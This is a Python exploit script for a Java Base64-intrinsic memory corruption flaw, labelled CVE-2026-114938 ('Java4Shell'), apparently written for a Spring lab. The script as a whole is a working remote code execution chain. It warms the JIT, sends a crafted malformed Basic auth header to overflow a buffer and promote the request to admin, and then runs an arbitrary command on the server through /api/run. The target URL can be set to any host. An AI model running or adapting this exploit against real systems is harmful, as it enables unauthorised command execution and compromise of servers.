#!/usr/bin/env python3
"""
Java4Shell (CVE-2026-114938) -- working remote RCE chain against the Spring lab.

Preconditions (all must hold):
  - OpenJDK 17.0.6+ / 21 < 21.0.13.1 / 25 < 25.0.5.1  (vulnerable build)
  - x86-64 with avx512f + avx512bw + avx512vbmi + bmi2
  - the Base64 intrinsic is NOT disabled (-XX:-UseBASE64Intrinsics defeats it)
  - the application decodes attacker-controlled Base64 into a fixed-size buffer
    allocated immediately before a security-relevant object

Chain, entirely over HTTP:
  1. WARM     valid decodes until C2 compiles the AVX-512 Base64 intrinsic
  2. TRIGGER  one malformed Basic header per warm window
              (a thrown IllegalArgumentException deoptimizes the intrinsic,
              so every landing needs its own warm cycle)
  3. SPILL    "A"*64 + "=" makes the intrinsic write 64 bytes at output
              offset 48 of a 65-byte buffer -> 62 bytes past the end
  4. PROMOTE  the spill overwrites the neighbouring authority object's mark
              word, klass pointer and admin byte; 0x9a is non-zero, and a
              field read does not dereference klass, so the gate opens
  5. EXECUTE  the promoted request reaches the application's command runner

The command runs in the SERVER process. This script executes nothing locally.

Usage:
  python java4shell.py
  python java4shell.py --cmd "id; uname -a"
  python java4shell.py --warm 25000 --attempts 5 --json
"""
import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor

UA = "java4shell-research/1.0"
VALID = base64.b64encode(b"labuser:labpass").decode()
TRIGGER = "A" * 64 + "="          # JDK 21/25/27
TRIGGER17 = "A" * 128 + "="       # JDK 17.0.6+


def call(url, basic=None, data=None, timeout=30.0):
    """POST and return (status, body). status is an int or 'ERR:<Type>'."""
    h = {"User-Agent": UA}
    if basic is not None:
        h["Authorization"] = "Basic " + basic
    if data is not None:
        h["Content-Type"] = "application/x-www-form-urlencoded"
    try:
        req = urllib.request.Request(url, data=data, headers=h, method="POST")
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return "ERR:" + type(e).__name__, str(e)


def main():
    ap = argparse.ArgumentParser(
        description="Java4Shell CVE-2026-114938 remote RCE chain")
    ap.add_argument("--base-url", default="http://127.0.0.1:18080",
                    help="lab base URL (default: local Spring lab)")
    ap.add_argument("--cmd", default="id; uname -a",
                    help="command to execute in the server process")
    ap.add_argument("--warm", type=int, default=25000,
                    help="valid decodes per warm cycle (20000 is the threshold)")
    ap.add_argument("--attempts", type=int, default=10,
                    help="warm+trigger cycles to try")
    ap.add_argument("--threads", type=int, default=8,
                    help="parallel warm clients")
    ap.add_argument("--jdk17", action="store_true",
                    help="use the 129-byte JDK 17 trigger")
    ap.add_argument("--json", action="store_true", help="emit a JSON report")
    ap.add_argument("--quiet", action="store_true", help="only print the result")
    a = ap.parse_args()

    base = a.base_url.rstrip("/")
    run_url = base + "/api/run"
    trigger = TRIGGER17 if a.jdk17 else TRIGGER
    body = urllib.parse.urlencode({"cmd": a.cmd}).encode()

    def say(msg):
        if not a.quiet:
            print(msg, flush=True)

    # ---- 0. baseline -------------------------------------------------------
    say("[*] baseline: unauthenticated request")
    st, txt = call(run_url, None, body)
    if isinstance(st, str):
        say("    cannot reach %s (%s)" % (run_url, st))
        say("    start the lab:  cd lab\\spring && docker compose up -d")
        return 2
    first = txt.strip().splitlines()[0][:70] if txt.strip() else ""
    say("    status=%s body=%r" % (st, first))
    if "denied" not in txt:
        say("    endpoint is not gated as expected; refusing to claim anything")
        return 2

    report = {"target": run_url, "warm": a.warm, "attempts": []}
    t_start = time.time()

    for attempt in range(a.attempts):
        # ---- 1. warm -------------------------------------------------------
        # NOTE: the warm phase must reach the JIT, not any particular request
        # count, so parallel clients are fine and cut wall time by ~10x.
        t0 = time.time()
        ok = 0
        err = ""
        warm_body = urllib.parse.urlencode({"cmd": "true"}).encode()

        def one_warm(_):
            s, _t = call(run_url, VALID, warm_body)
            return s

        last_report = 0.0
        say("[%d] warming: %d decodes across %d threads (progress every 10%%)"
            % (attempt, a.warm, a.threads))
        with ThreadPoolExecutor(max_workers=a.threads) as ex:
            for i, s in enumerate(ex.map(one_warm, range(a.warm)), 1):
                if isinstance(s, str):
                    if not err:
                        err = s
                    continue
                ok += 1
                if i * 10 // a.warm != last_report:
                    last_report = i * 10 // a.warm
                    el = time.time() - t0
                    say("    %d%% (%d/%d) %.1fs %.0f rps"
                        % (i * 100 // a.warm, i, a.warm, el, i / max(el, 1e-9)))
        dt = time.time() - t0
        if ok == 0:
            say("[%d] warm failed: %s" % (attempt, err))
            return 2
        say("[%d] warm %d/%d decodes in %.1fs (%.0f rps)"
            % (attempt, ok, a.warm, dt, ok / max(dt, 1e-9)))

        # ---- 2+3+4. trigger, spill, promote --------------------------------
        st, txt = call(run_url, trigger, body)
        line = txt.strip().splitlines()[0] if txt.strip() else ""
        say("[%d] trigger status=%s %r" % (attempt, st, line[:70]))
        report["attempts"].append({"attempt": attempt, "status": st,
                                   "first_line": line, "warm_ok": ok})

        if "admin:" in txt:
            report["result"] = "RCE"
            report["command"] = a.cmd
            report["output"] = txt
            report["seconds"] = round(time.time() - t_start, 1)
            if a.json:
                print(json.dumps(report, indent=2))
            else:
                print()
                print("=== RCE CONFIRMED ===")
                print("server process executed: %s" % a.cmd)
                print(txt)
            return 0

    report["result"] = "NO_LANDING"
    report["seconds"] = round(time.time() - t_start, 1)
    if a.json:
        print(json.dumps(report, indent=2))
    else:
        print()
        print("=== no landing in %d attempts ===" % a.attempts)
        print("delivery proven; the authority object did not land in the spill window.")
        print("check: -XX:-UseBASE64Intrinsics not set, CPU has avx512vbmi, "
              "JDK < 21.0.13.1")
    return 1


if __name__ == "__main__":
    sys.exit(main())
